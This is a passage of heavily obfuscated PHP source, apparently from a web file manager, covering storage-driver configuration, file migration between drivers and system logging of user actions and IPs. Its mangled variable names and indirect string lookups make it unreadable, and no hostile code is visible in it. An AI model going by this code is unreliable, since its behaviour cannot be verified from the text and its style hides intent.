$©ç¥ÊÔ[$–öàÏÃ[$Ã†ıÉÄ [453]]] : 0; } return $·Ş­·À; } public function ioSizeUseGet($¼‹±Ò¯¦) { $¯‰Ğ‰´ß =& $_SERVER[ú‡®¯¨±]; if (!$¼‹±Ò¯¦) { return array(); } $Àãâ§â– = $¯‰Ğ‰´ß[2228] . implode($¯‰Ğ‰´ß[50], $¼‹±Ò¯¦); $©„Üô§Î = Cache::get($Àãâ§â–); if ($©„Üô§Î) { return $©„Üô§Î; } $‘õó¤»š = array($¯‰Ğ‰´ß[872] => $¯‰Ğ‰´ß[453], $¯‰Ğ‰´ß[2229] => $¯‰Ğ‰´ß[78]); $ñİÆš˜å = array($¯‰Ğ‰´ß[872] => array($¯‰Ğ‰´ß[7], $¼‹±Ò¯¦)); $©„Üô§Î = Model($¯‰Ğ‰´ß[844])->field($‘õó¤»š)->where($ñİÆš˜å)->group($¯‰Ğ‰´ß[872])->select(); $©„Üô§Î = array_to_keyvalue($©„Üô§Î, $¯‰Ğ‰´ß[453], $¯‰Ğ‰´ß[78]); Cache::set($Àãâ§â–, $©„Üô§Î, 600); return $©„Üô§Î; } public function getConfig($¥‹¹‘«‚) { $ßÜ•¾ˆ = parent::listData($¥‹¹‘«‚); return json_decode($ßÜ•¾ˆ[$_SERVER[ú‡®¯¨±][6]], !0); } public function update($Ä ›—…ë, $Âğ·§şŒ) { $üøıÜ“Ş =& $_SERVER[ú‡®¯¨±]; $Ğ‚‹Û = $Âğ·§şŒ[$üøıÜ“Ş[32]]; $àüÔ´Àß = array_to_keyvalue(parent::listData(), $üøıÜ“Ş[32]); if (isset($àüÔ´Àß[$Ğ‚‹Û]) && $àüÔ´Àß[$Ğ‚‹Û][$üøıÜ“Ş[453]] != $Ä ›—…ë) { return !1; } $this->checkPwd($Ä ›—…ë, $Âğ·§şŒ); if (isset($Âğ·§şŒ[$üøıÜ“Ş[2230]]) && $Âğ·§şŒ[$üøıÜ“Ş[2230]] == $üøıÜ“Ş[90]) { $this->checkConfig($Âğ·§şŒ); } unset($Âğ·§şŒ[$üøıÜ“Ş[2230]]); $•ŸÚŒşË = parent::update($Ä ›—…ë, $Âğ·§şŒ); if ($•ŸÚŒşË && $Âğ·§şŒ[$üøıÜ“Ş[37]]) { $ö¾§öı– = 0; foreach ($àüÔ´Àß as $áÄ¦ŞÊ¿) { if ($áÄ¦ŞÊ¿[$üøıÜ“Ş[37]] && $áÄ¦ŞÊ¿[$üøıÜ“Ş[453]] != $Ä ›—…ë) { $ö¾§öı– = $áÄ¦ŞÊ¿[$üøıÜ“Ş[453]]; parent::update($áÄ¦ŞÊ¿[$üøıÜ“Ş[453]], array($üøıÜ“Ş[37] => 0)); } } $this->updateBackup($Ä ›—…ë, $ö¾§öı–); } return $•ŸÚŒşË; } public function add($£ÏŠÕ‚ˆ) { $çÌ…ôá£ =& $_SERVER[ú‡®¯¨±]; $é³»Éƒ = array_to_keyvalue(parent::listData(), $çÌ…ôá£[32]); if (isset($é³»Éƒ[$£ÏŠÕ‚ˆ[$çÌ…ôá£[32]]])) { return !1; } $this->checkConfig($£ÏŠÕ‚ˆ); $¡Ìß—Öß = parent::insert($£ÏŠÕ‚ˆ); if ($¡Ìß—Öß && $£ÏŠÕ‚ˆ[$çÌ…ôá£[37]]) { foreach ($é³»Éƒ as $ñºß™¡Ñ) { if ($ñºß™¡Ñ[$çÌ…ôá£[37]]) { parent::update($ñºß™¡Ñ[$çÌ…ôá£[453]], array($çÌ…ôá£[37] => 0)); } } } return $¡Ìß—Öß; } public function updateBackup($Üâ¡å—, $ãş±ÕÀĞ) { $‰­¯¬ÊÖ =& $_SERVER[ú‡®¯¨±]; if (!$ãş±ÕÀĞ) { return; } $Ø’×Ì™’ = Model($‰­¯¬ÊÖ[804])->config(); if ($Ø’×Ì™’[$‰­¯¬ÊÖ[1678]] != $‰­¯¬ÊÖ[90] || $Ø’×Ì™’[$‰­¯¬ÊÖ[806]] != $ãş±ÕÀĞ) { return; } $¸ä‰ˆ = Model($‰­¯¬ÊÖ[825])->get($‰­¯¬ÊÖ[835]); $¸ä‰ˆ = json_decode($¸ä‰ˆ, !0); if (!$¸ä‰ˆ) { return; } $¸ä‰ˆ[$‰­¯¬ÊÖ[806]] = $Üâ¡å—; Model($‰­¯¬ÊÖ[825])->set(array($‰­¯¬ÊÖ[835] => $¸ä‰ˆ)); } public function checkPwd($Üøıµ½, &$ğäº¨õ ) { $ÑĞçå—ß =& $_SERVER[ú‡®¯¨±]; if (empty($ğäº¨õ [$ÑĞçå—ß[6]])) { return; } $í•î¬¡¬ = json_decode($ğäº¨õ [$ÑĞçå—ß[6]], !0); $÷Š³¯ÑÅ = $ÑĞçå—ß[12]; $ĞŠíÎªÕ = array($ÑĞçå—ß[2231], $ÑĞçå—ß[2232], $ÑĞçå—ß[945]); foreach ($ĞŠíÎªÕ as $ˆçµÕŒ”) { if (isset($í•î¬¡¬[$ˆçµÕŒ”])) { $÷Š³¯ÑÅ = $ˆçµÕŒ”; break; } } if (!$÷Š³¯ÑÅ) { return; } $öÔ™Ñ¼ = $this->getConfig($Üøıµ½); $ü·‹‹â¥ = $öÔ™Ñ¼[$÷Š³¯ÑÅ]; $øøÙÖ§Ó = $í•î¬¡¬[$÷Š³¯ÑÅ]; if ($øøÙÖ§Ó == str_repeat($ÑĞçå—ß[215], strlen($ü·‹‹â¥))) { $í•î¬¡¬[$÷Š³¯ÑÅ] = $ü·‹‹â¥; $ğäº¨õ [$ÑĞçå—ß[6]] = json_encode($í•î¬¡¬); } else { if ($øøÙÖ§Ó != $ü·‹‹â¥) { $ğäº¨õ [$ÑĞçå—ß[2230]] = $ÑĞçå—ß[90]; } } } public function checkConfig(&$£¼¯ĞËÖ, $Ÿı–÷Ğ = false) { $Á¯•ùŒ® =& $_SERVER[ú‡®¯¨±]; $Şø¦ñÄÑ = strtolower($£¼¯ĞËÖ[$Á¯•ùŒ®[97]]); $­ª¾åù = json_decode($£¼¯ĞËÖ[$Á¯•ùŒ®[6]], !0); foreach ($­ª¾åù as $İüùçÓ => $Æê„ó¬) { if (is_string($Æê„ó¬)) { $­ª¾åù[$İüùçÓ] = trim($Æê„ó¬); } } $­ª¾åù[$Á¯•ùŒ®[2233]] = rand_string(6); $¶Àì¬É‹ = $GLOBALS[$Á¯•ùŒ®[6]][$Á¯•ùŒ®[91]][$Á¯•ùŒ®[881]]; $…ˆÜ¶Öô = isset($¶Àì¬É‹[$Şø¦ñÄÑ]) ? $¶Àì¬É‹[$Şø¦ñÄÑ] : ucfirst($Şø¦ñÄÑ); $ ÚÓŸõß = $Á¯•ùŒ®[76] . $…ˆÜ¶Öô; if (!$…ˆÜ¶Öô || !class_exists($ ÚÓŸõß)) { if ($Ÿı–÷Ğ) { return LNG($Á¯•ùŒ®[2234]); } write_log(array($Á¯•ùŒ®[2235], $£¼¯ĞËÖ, get_caller_info()), $Á¯•ùŒ®[2236]); show_json(LNG($Á¯•ùŒ®[2234]), !1, $£¼¯ĞËÖ); } $à±Šá«§ = new $ ÚÓŸõß($­ª¾åù); if (in_array($Şø¦ñÄÑ, $à±Šá«§->objectDriver)) { if (!$à±Šá«§->isBucketCors() && !$à±Šá«§->setBucketCors()) { $ìëÊíå÷ = LNG($Á¯•ùŒ®[2237]); $ìëÊíå÷ .= $Á¯•ùŒ®[2238] . LNG($Á¯•ùŒ®[2239]); if ($Ÿı–÷Ğ) { return $ìëÊíå÷; } show_json($ìëÊíå÷, !1); } } $×‘«æÁó = rtrim($­ª¾åù[$Á¯•ùŒ®[1236]], $Á¯•ùŒ®[8]) . $Á¯•ùŒ®[8]; $ƒç¾ÕŠÛ = $à±Šá«§->getPath($×‘«æÁó . $Á¯•ùŒ®[1240]); if (!$à±Šá«§->mkfile($ƒç¾ÕŠÛ)) { if ($Ÿı–÷Ğ) { return LNG($Á¯•ùŒ®[2237]); } show_json(LNG($Á¯•ùŒ®[2237]), !1); } $­ª¾åù[$Á¯•ùŒ®[1236]] = $×‘«æÁó; $£¼¯ĞËÖ[$Á¯•ùŒ®[6]] = json_encode($­ª¾åù); $£¼¯ĞËÖ[$Á¯•ùŒ®[97]] = $…ˆÜ¶Öô; return !0; } public function driverListSystem() { $¼çøÌıå =& $_SERVER[ú‡®¯¨±]; $Œá³›ê = parent::listData(); $ó‰§õË = array(); foreach ($Œá³›ê as $ÅØÖ©Èõ) { unset($ÅØÖ©Èõ[$¼çøÌıå[227]], $ÅØÖ©Èõ[$¼çøÌıå[87]]); $ÅØÖ©Èõ[$¼çøÌıå[6]] = json_decode($ÅØÖ©Èõ[$¼çøÌıå[6]], !0); $ó‰§õË[] = $ÅØÖ©Èõ; } return $ó‰§õË; } public function defaultDriver() { $­ÓŸß£º =& $_SERVER[ú‡®¯¨±]; $‘‘ûÒÉ… = parent::listData(); $òò òÔª = array_filter_by_field($‘‘ûÒÉ…, $­ÓŸß£º[37], 1); $òò òÔª = $òò òÔª[0]; if ($òò òÔª) { $òò òÔª[$­ÓŸß£º[6]] = json_decode($òò òÔª[$­ÓŸß£º[6]], !0); } return $òò òÔª; } public function driverInfo($„ö ÅÍ) { $âüíû› =& $_SERVER[ú‡®¯¨±]; $üÃ¾«Õ = array_to_keyvalue(parent::listData(), $âüíû›[453]); if (!isset($üÃ¾«Õ[$„ö ÅÍ])) { return !1; } $¬Ø—£ = $üÃ¾«Õ[$„ö ÅÍ]; $¬Ø—£[$âüíû›[6]] = json_decode($¬Ø—£[$âüíû›[6]], !0); return $¬Ø—£; } public function remove($«‚ëå) { $this->removeShareItems($«‚ëå); return parent::remove($«‚ëå); } public function removeWithFile($ãæ¢‡„Ó, $“êˆÍ¹¨) { $ºô‹—îî =& $_SERVER[ú‡®¯¨±]; $ûØ–üÏ = array($ºô‹—îî[872] => $ãæ¢‡„Ó); $è¡€şœ¨ = Model($ºô‹—îî[522])->where($ûØ–üÏ)->count(); $ö¾¶íõ = Model($ºô‹—îî[522])->where($ûØ–üÏ)->sum($ºô‹—îî[78]); $şÚÕÕü = $“êˆÍ¹¨ . $ºô‹—îî[2240] . $ãæ¢‡„Ó; $—ğËœÑ  = LNG($“êˆÍ¹¨ == $ºô‹—îî[598] ? $ºô‹—îî[2241] : $ºô‹—îî[2242]); $Ààß˜´Â = new TaskFileTransfer($şÚÕÕü, $ºô‹—îî[2236], $è¡€şœ¨, $—ğËœÑ  . "\50{$ãæ¢‡„Ó}\x29"); $Ààß˜´Â->task[$ºô‹—îî[818]] = (double) $ö¾¶íõ; $×ñŸµÁİ = KodIO::defaultDriver(); $ğŠÂôÜ = $×ñŸµÁİ[$ºô‹—îî[453]]; $›Œ¥÷Èì = "\173\151\157\x3a{$ğŠÂôÜ}\x7d\x2f"; $€¶ğ¾¢… = !0; $äèê›©€ = array(); $¬ƒÈçİÖ = Model($ºô‹—îî[226])->where($ûØ–üÏ)->field($ºô‹—îî[2243])->select(); foreach ($¬ƒÈçİÖ as $ïÚš‡Èò) { $¦üš¦Ì¶ = $ïÚš‡Èò[$ºô‹—îî[86]]; $÷ÈÉœæ = $›Œ¥÷Èì . str_replace("\x7b\151\x6f\72{$ãæ¢‡„Ó}\x7d\x2f", $ºô‹—îî[12], $¦üš¦Ì¶); if (!IO::exist($¦üš¦Ì¶)) { $äèê›©€[] = $ïÚš‡Èò[$ºô‹—îî[519]]; $Ààß˜´Â->updateFileEnd($ïÚš‡Èò[$ºô‹—îî[32]], $ïÚš‡Èò[$ºô‹—îî[78]]); continue; } if (IO::exist($÷ÈÉœæ)) { $Ààß˜´Â->updateFileEnd($ïÚš‡Èò[$ºô‹—îî[32]], $ïÚš‡Èò[$ºô‹—îî[78]]); continue; } if (!IO::move($¦üš¦Ì¶, get_path_father($÷ÈÉœæ))) { $€¶ğ¾¢… = !1; break; } $ûØ–üÏ = array($ºô‹—îî[519] => $ïÚš‡Èò[$ºô‹—îî[519]]); $ø˜–áòÖ = array($ºô‹—îî[872] => $ğŠÂôÜ, $ºô‹—îî[86] => $÷ÈÉœæ); Model($ºô‹—îî[226])->where($ûØ–üÏ)->save($ø˜–áòÖ); } $this->removeByFileID($äèê›©€); if (!$€¶ğ¾¢…) { $Ààß˜´Â->stop($şÚÕÕü); return !1; } $Ààß˜´Â->end(); if ($“êˆÍ¹¨ == $ºô‹—îî[1875]) { $this->remove($ãæ¢‡„Ó); } } public function progress($Ë™¦üê, $‚Ù§’Ûİ) { return Task::get($‚Ù§’Ûİ . $_SERVER[ú‡®¯¨±][2240] . $Ë™¦üê); } private function removeByFileID($å–Ä¡ = array()) { $µ¢Ş…ºğ =& $_SERVER[ú‡®¯¨±]; if (empty($å–Ä¡)) { return; } $Ï¼Î×ùú = array($µ¢Ş…ºğ[519] => array($µ¢Ş…ºğ[7], $å–Ä¡)); $°âó‰Ä = Model($µ¢Ş…ºğ[1389])->where($Ï¼Î×ùú)->field($µ¢Ş…ºğ[183])->select(); if (!$°âó‰Ä) { return; } $°âó‰Ä = array_to_keyvalue($°âó‰Ä, $µ¢Ş…ºğ[12], $µ¢Ş…ºğ[183]); foreach ($°âó‰Ä as $‹”©æ®) { Model($µ¢Ş…ºğ[468])->removeNow($‹”©æ®, !1); } } private function removeShareItems($Öò‰´ú¤) { $Å×³„™ =& $_SERVER[ú‡®¯¨±]; $ÔÎÔ¾ëî = "\x7b\151\x6f\72{$Öò‰´ú¤}\175\57"; $Üáåüñ = array($Å×³„™[183] => 0, $Å×³„™[1231] => array($Å×³„™[437], "{$ÔÎÔ¾ëî}\45")); $ìô®…›Ò = Model($Å×³„™[1886])->where($Üáåüñ)->field($Å×³„™[643])->select(); if (empty($ìô®…›Ò)) { return; } $“Â•ğòó = array_to_keyvalue($ìô®…›Ò, $Å×³„™[12], $Å×³„™[643]); Model($Å×³„™[642])->remove($“Â•ğòó); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x4c\x69\x67\150\x74\x41\x70\160"; public $modelType = "\123\x79\x73\164\x65\x6d\x4f\160\164\151\157\x6e"; public $field = array("\156\x61\155\x65", "\x67\162\157\x75\160", "\x64\145\x73\143", "\x63\157\x6e\x74\x65\x6e\x74"); public function listData($³¢‰õ‰‡ = false, $ÎÓÉµç¬ = "\x6d\157\144\151\x66\x79\124\x69\155\x65", $ïŠ¤ÔÂ¾ = true) { return parent::listData($³¢‰õ‰‡, $ÎÓÉµç¬, $ïŠ¤ÔÂ¾); } public function remove($ú…Ñ¼Ñ¦) { $àş‘Ç¢ = $this->findByName($ú…Ñ¼Ñ¦); if (!$àş‘Ç¢) { return !1; } return parent::remove($àş‘Ç¢[$_SERVER[ú‡®¯¨±][453]]); } public function add($õ¡Úå±£) { if ($this->findByName($õ¡Úå±£[$_SERVER[ú‡®¯¨±][32]])) { return !1; } return parent::insert($õ¡Úå±£); } public function update($Â¬ÙçêÖ, $µ°§½è¥) { $–ĞÀ¿‡ß =& $_SERVER[ú‡®¯¨±]; $è×Î¹äƒ = $this->findByName($Â¬ÙçêÖ); $’£‹³Ù† = $this->findByName($µ°§½è¥[$–ĞÀ¿‡ß[32]]); if (!$è×Î¹äƒ || $’£‹³Ù† && $’£‹³Ù†[$–ĞÀ¿‡ß[453]] != $è×Î¹äƒ[$–ĞÀ¿‡ß[453]]) { return !1; } return parent::update($è×Î¹äƒ[$–ĞÀ¿‡ß[453]], $µ°§½è¥); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\x6d\145", "\164\151\155\145", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $çû×÷¶¼ =& $_SERVER[ú‡®¯¨±]; return array($çû×÷¶¼[2244] => LNG($çû×÷¶¼[2245]), $çû×÷¶¼[2246] => LNG($çû×÷¶¼[2247]), $çû×÷¶¼[1849] => LNG($çû×÷¶¼[2248]), $çû×÷¶¼[2249] => LNG($çû×÷¶¼[2250]), $çû×÷¶¼[2251] => LNG($çû×÷¶¼[2252]), $çû×÷¶¼[2253] => LNG($çû×÷¶¼[2254]), $çû×÷¶¼[2255] => LNG($çû×÷¶¼[2256]), $çû×÷¶¼[1879] => LNG($çû×÷¶¼[2256]), $çû×÷¶¼[1880] => LNG($çû×÷¶¼[2257]), $çû×÷¶¼[2258] => LNG($çû×÷¶¼[2259]), $çû×÷¶¼[2260] => LNG($çû×÷¶¼[2261]), $çû×÷¶¼[2262] => LNG($çû×÷¶¼[2263]), $çû×÷¶¼[2264] => LNG($çû×÷¶¼[2265]), $çû×÷¶¼[1877] => LNG($çû×÷¶¼[2266]), $çû×÷¶¼[2267] => LNG($çû×÷¶¼[2268]), $çû×÷¶¼[1884] => LNG($çû×÷¶¼[2269]), $çû×÷¶¼[2270] => LNG($çû×÷¶¼[2271]), $çû×÷¶¼[2272] => LNG($çû×÷¶¼[2273]), $çû×÷¶¼[2274] => LNG($çû×÷¶¼[2275]), $çû×÷¶¼[2276] => LNG($çû×÷¶¼[2277]), $çû×÷¶¼[1887] => LNG($çû×÷¶¼[2278]), $çû×÷¶¼[1888] => LNG($çû×÷¶¼[2279]), $çû×÷¶¼[2280] => LNG($çû×÷¶¼[2281]), $çû×÷¶¼[2282] => LNG($çû×÷¶¼[2283]), $çû×÷¶¼[2284] => LNG($çû×÷¶¼[2285]), $çû×÷¶¼[1882] => LNG($çû×÷¶¼[2286]), $çû×÷¶¼[2287] => LNG($çû×÷¶¼[2288]), $çû×÷¶¼[1881] => LNG($çû×÷¶¼[2289]), $çû×÷¶¼[2290] => LNG($çû×÷¶¼[2291]), $çû×÷¶¼[2292] => LNG($çû×÷¶¼[2293]), $çû×÷¶¼[2294] => LNG($çû×÷¶¼[2295]), $çû×÷¶¼[2296] => LNG($çû×÷¶¼[2296]), $çû×÷¶¼[2297] => LNG($çû×÷¶¼[1853]), $çû×÷¶¼[2298] => LNG($çû×÷¶¼[2299]), $çû×÷¶¼[2300] => LNG($çû×÷¶¼[2301]), $çû×÷¶¼[2302] => LNG($çû×÷¶¼[2303]), $çû×÷¶¼[2304] => LNG($çû×÷¶¼[2305]), $çû×÷¶¼[2306] => LNG($çû×÷¶¼[2307]), $çû×÷¶¼[2308] => LNG($çû×÷¶¼[2308]), $çû×÷¶¼[2309] => LNG($çû×÷¶¼[2310]), $çû×÷¶¼[2311] => LNG($çû×÷¶¼[2312]), $çû×÷¶¼[2313] => LNG($çû×÷¶¼[2314]), $çû×÷¶¼[2315] => LNG($çû×÷¶¼[2316]), $çû×÷¶¼[2317] => LNG($çû×÷¶¼[2318]), $çû×÷¶¼[2319] => LNG($çû×÷¶¼[2320])); } private function typeFile() { $¨©‡ì¯ü =& $_SERVER[ú‡®¯¨±]; $ÄõÒë…¾ = array($¨©‡ì¯ü[1884] => array($¨©‡ì¯ü[1885]), $¨©‡ì¯ü[2262] => array($¨©‡ì¯ü[2321]), $¨©‡ì¯ü[2264] => array($¨©‡ì¯ü[2322]), $¨©‡ì¯ü[1877] => array($¨©‡ì¯ü[1878], $¨©‡ì¯ü[2323]), $¨©‡ì¯ü[2272] => array(), $¨©‡ì¯ü[2274] => array(), $¨©‡ì¯ü[2276] => array(), $¨©‡ì¯ü[1887] => array($¨©‡ì¯ü[1889]), $¨©‡ì¯ü[1888] => array($¨©‡ì¯ü[1889]), $¨©‡ì¯ü[2280] => array($¨©‡ì¯ü[2324]), $¨©‡ì¯ü[2282] => array($¨©‡ì¯ü[2324]), $¨©‡ì¯ü[2284] => array($¨©‡ì¯ü[2325]), $¨©‡ì¯ü[2270] => array($¨©‡ì¯ü[2326]), $¨©‡ì¯ü[1882] => array($¨©‡ì¯ü[2327]), $¨©‡ì¯ü[2287] => array($¨©‡ì¯ü[2328]), $¨©‡ì¯ü[1881] => array($¨©‡ì¯ü[1883])); return $ÄõÒë…¾; } private function typeAll() { $ÁÀï½» =& $_SERVER[ú‡®¯¨±]; $—½øèıÍ = $this->typeList; $ï·¦—™ = array_filter($this->typeFile()); foreach ($ï·¦—™ as $ºœ½€½ => $ÖÅòÅ’š) { $—½øèıÍ[$ÖÅòÅ’š[0]] = $—½øèıÍ[$ºœ½€½]; } $—½øèıÍ[$ÁÀï½»[1889]] = LNG($ÁÀï½»[2329]); $—½øèıÍ[$ÁÀï½»[2324]] = LNG($ÁÀï½»[2330]); return $—½øèıÍ; } public function addLog($›¢¢°±Å, $Êùø¸ = array()) { $ĞÓ¨Ì‰¿ =& $_SERVER[ú‡®¯¨±]; if (!isset($this->typeList[$›¢¢°±Å])) { return; } $•Ğ¥Í…ª = isset($Êùø¸[$ĞÓ¨Ì‰¿[1708]]) ? $Êùø¸[$ĞÓ¨Ì‰¿[1708]] : 0; if (!$•Ğ¥Í…ª) { $•Ğ¥Í…ª = Session::get($ĞÓ¨Ì‰¿[2043]); } if ($›¢¢°±Å == $ĞÓ¨Ì‰¿[2298] && is_array($Êùø¸[$ĞÓ¨Ì‰¿[2331]]) && !$Êùø¸[$ĞÓ¨Ì‰¿[2331]]) { return; } $¢áÓ¨ö = get_client_ip(); if (!$Êùø¸ || strlen(json_encode($Êùø¸)) >= 1024) { $Êùø¸ = array($ĞÓ¨Ì‰¿[2332] => $¢áÓ¨ö); } else { if (is_array($Êùø¸)) { $Êùø¸[$ĞÓ¨Ì‰¿[2332]] = $¢áÓ¨ö; } else { $Êùø¸ = array($ĞÓ¨Ì‰¿[1258] => $Êùø¸, $ĞÓ¨Ì‰¿[2332] => $¢áÓ¨ö); } } $Êùø¸ = array($ĞÓ¨Ì‰¿[1698] => Session::sign(), $ĞÓ¨Ì‰¿[1699] => intval($•Ğ¥Í…ª), $ĞÓ¨Ì‰¿[33] => $›¢¢°±Å, $ĞÓ¨Ì‰¿[1701] => json_encode($Êùø¸)); parent::add($Êùø¸); } public function remove($¢ĞÃÄÏ ) { $this->where(array($_SERVER[ú‡®¯¨±][471] => $¢ĞÃÄÏ ))->delete(); } private function _makeOrder($âêã¶á¿ = '') { $¿å‹’— =& $_SERVER[ú‡®¯¨±]; $Í€şĞâ¥ = $¿å‹’—[227]; $Ü³©ÄÖË = array($¿å‹’—[501] => $¿å‹’—[502], $¿å‹’—[503] => $¿å‹’—[504]); $àü¯ßùã = Input::get($¿å‹’—[509], $¿å‹’—[7], $¿å‹’—[2079], array($¿å‹’—[1997], $¿å‹’—[503])); $àü¯ßùã = $Ü³©ÄÖË[$àü¯ßùã]; $âêã¶á¿ = $âêã¶á¿ . "{$Í€şĞâ¥}\x20{$àü¯ßùã}"; return $this->order($âêã¶á¿); } public function get($ôÅ¼úµç = '') { $ãÀô‡•¼ =& $_SERVER[ú‡®¯¨±]; if (!$ôÅ¼úµç) { show_json(array()); } $¹—áÆ Ä = array(); if ($ôÅ¼úµç[$ãÀô‡•¼[1708]]) { $¹—áÆ Ä[$ãÀô‡•¼[1708]] = $ôÅ¼úµç[$ãÀô‡•¼[1708]]; } if (isset($ôÅ¼úµç[$ãÀô‡•¼[815]])) { $ğÈªœà² = $ôÅ¼úµç[$ãÀô‡•¼[815]]; $¤Ê¸ü£ = isset($ôÅ¼úµç[$ãÀô‡•¼[816]]) ? $ôÅ¼úµç[$ãÀô‡•¼[816]] : time(); $¹—áÆ Ä[$ãÀô‡•¼[227]] = array($ãÀô‡•¼[388], array($ğÈªœà², $¤Ê¸ü£)); } if ($ôÅ¼úµç[$ãÀô‡•¼[33]]) { $ ½ºåŒ = explode($ãÀô‡•¼[50], $ôÅ¼úµç[$ãÀô‡•¼[33]]); $œŞ‘şØ¦ = $this->typeFile(); $‰¾­Ãß£ = array(); foreach ($ ½ºåŒ as $ĞÙ¤ÁÇí) { $‰¾­Ãß£[] = $ĞÙ¤ÁÇí; if (isset($œŞ‘şØ¦[$ĞÙ¤ÁÇí])) { $‰¾­Ãß£ = array_merge($‰¾­Ãß£, $œŞ‘şØ¦[$ĞÙ¤ÁÇí]); } } $‰¾­Ãß£ = array_unique($‰¾­Ãß£); if ($‰¾­Ãß£) { $¹—áÆ Ä[$ãÀô‡•¼[33]] = array($ãÀô‡•¼[7], $‰¾­Ãß£); } } else { $¹—áÆ Ä[$ãÀô‡•¼[33]] = array($ãÀô‡•¼[2333], $ãÀô‡•¼[2334]); } if (!empty($ôÅ¼úµç[$ãÀô‡•¼[2332]])) { $¹—áÆ Ä[$ãÀô‡•¼[504]] = array($ãÀô‡•¼[437], "\45{$ôÅ¼úµç[$ãÀô‡•¼[2332]]}\x25"); } $Úâİ¹û = $this->_makeOrder()->where($¹—áÆ Ä)->selectPage(); if (empty($Úâİ¹û[$ãÀô‡•¼[424]])) { show_json(array(), !0, $Úâİ¹û[$ãÀô‡•¼[421]]); } $Úâİ¹û[$ãÀô‡•¼[424]] = $this->logList($Úâİ¹û[$ãÀô‡•¼[424]]); return $Úâİ¹û; } private function ipAddress(&$ˆåÆÄ‹è) { $Ôä‹á†Õ =& $_SERVER[ú‡®¯¨±]; if (!empty($ˆåÆÄ‹è[$Ôä‹á†Õ[2332]])) { $ı¥›Öø = IpLocation::get($ˆåÆÄ‹è[$Ôä‹á†Õ[2332]]); } else { $ı¥›Öø = LNG($Ôä‹á†Õ[2335]); } $ˆåÆÄ‹è[$Ôä‹á†Õ[2336]] = $ı¥›Öø; } private function descZipDownload($·‹…»­, &$˜ãá™ªÛ) { $­ÏŸà± =& $_SERVER[ú‡®¯¨±]; if (!isset($·‹…»­[$­ÏŸà±[2337]])) { return; } $Ûƒ“Û÷À = json_decode($·‹…»­[$­ÏŸà±[2337]], !0); foreach ($Ûƒ“Û÷À as $ï“‹œÁİ) { try { $¨ë¢•Ó× = IO::infoFullSimple($ï“‹œÁİ[$­ÏŸà±[86]]); } catch (Exception $ß«ß±ù) { continue; } $·‹…»­[$­ÏŸà±[86]] = $ï“‹œÁİ[$­ÏŸà±[86]]; $˜ãá™ªÛ[] = $·‹…»­[$­ÏŸà±[183]] = $¨ë¢•Ó×[$­ÏŸà±[183]]; $˜ãá™ªÛ[] = $·‹…»­[$­ÏŸà±[2136]] = $¨ë¢•Ó×[$­ÏŸà±[182]]; break; } return $·‹…»­; } private function getSourceList(&$£òç€’÷) { $†€œ§› =& $_SERVER[ú‡®¯¨±]; $…—£… = array(); foreach ($£òç€’÷ as $¥¢­ô¸Í => $«½ĞÇ„¯) { $–ÕÁÙë = json_decode($«½ĞÇ„¯[$†€œ§›[504]], !0); if ($«½ĞÇ„¯[$†€œ§›[33]] == $†€œ§›[1880]) { $–ÕÁÙë = $this->descZipDownload($–ÕÁÙë, $…—£…); $£òç€’÷[$¥¢­ô¸Í][$†€œ§›[504]] = json_encode($–ÕÁÙë); continue; } if (strpos($«½ĞÇ„¯[$†€œ§›[33]], $†€œ§›[2138]) !== 0) { if (!isset($–ÕÁÙë[$†€œ§›[86]]) || strpos($«½ĞÇ„¯[$†€œ§›[33]], $†€œ§›[2338]) !== 0) { continue; } try { $Üš¦í¦ = IO::infoFullSimple($–ÕÁÙë[$†€œ§›[86]]); } catch (Exception $ÂıÍ€¼â) { continue; } $…—£…[] = $–ÕÁÙë[$†€œ§›[183]] = $Üš¦í¦[$†€œ§›[183]]; $…—£…[] = $–ÕÁÙë[$†€œ§›[2136]] = $Üš¦í¦[$†€œ§›[182]]; $£òç€’÷[$¥¢­ô¸Í][$†€œ§›[504]] = json_encode($–ÕÁÙë); continue; } $…—£…[] = $–ÕÁÙë[$†€œ§›[183]]; $…—£…[] = $–ÕÁÙë[$†€œ§›[2136]]; if ($–ÕÁÙë[$†€œ§›[33]] == $†€œ§›[598]) { $…—£…[] = $–ÕÁÙë[$†€œ§›[504]][$†€œ§›[1216]]; $…—£…[] = $–ÕÁÙë[$†€œ§›[504]][$†€œ§›[1217]]; } if ($–ÕÁÙë[$†€œ§›[33]] == $†€œ§›[2146]) { $…—£…[] = $–ÕÁÙë[$†€œ§›[504]][$†€œ§›[183]]; } } if (!$…—£…) { return array(); } return Model($†€œ§›[880])->sourceListInfo($…—£…, !0); } private function logList($ ÓÆ¿•) { $Éæ¯Êø• =& $_SERVER[ú‡®¯¨±]; $Óè´Õ†Î = array_to_keyvalue($ ÓÆ¿•, $Éæ¯Êø•[12], $Éæ¯Êø•[1708]); $ÑÚÜ·­÷ = Model($Éæ¯Êø•[577])->userListInfo(array_unique($Óè´Õ†Î)); $ã™ôëÖ” = $this->getSourceList($ ÓÆ¿•); $…¡ÙÏ· = $this->typeAll(); $’ŸšË = array(); $¼üõ•½¹ = array(); foreach ($ ÓÆ¿• as $À»ß²¿œ => $ÛÉı¨óŒ) { $¸­®‡ÕŞ = $ÛÉı¨óŒ[$Éæ¯Êø•[33]]; $ÕÒ¼˜»ï = isset($ÑÚÜ·­÷[$ÛÉı¨óŒ[$Éæ¯Êø•[1708]]]) ? $ÑÚÜ·­÷[$ÛÉı¨óŒ[$Éæ¯Êø•[1708]]] : !1; $Ó™ÛáÏÀ = strpos($¸­®‡ÕŞ, $Éæ¯Êø•[2339]) === 0 ? LNG($Éæ¯Êø•[2340]) : LNG($Éæ¯Êø•[2335]); $ÛÉı¨óŒ[$Éæ¯Êø•[32]] = isset($ÕÒ¼˜»ï[$Éæ¯Êø•[32]]) ? $ÕÒ¼˜»ï[$Éæ¯Êø•[32]] : LNG($Éæ¯Êø•[2335]); $ÛÉı¨óŒ[$Éæ¯Êø•[2190]] = isset($ÕÒ¼˜»ï[$Éæ¯Êø•[2190]]) ? $ÕÒ¼˜»ï[$Éæ¯Êø•[2190]] : $Éæ¯Êø•[12]; $ÛÉı¨óŒ[$Éæ¯Êø•[1598]] = isset($…¡ÙÏ·[$¸­®‡ÕŞ]) ? 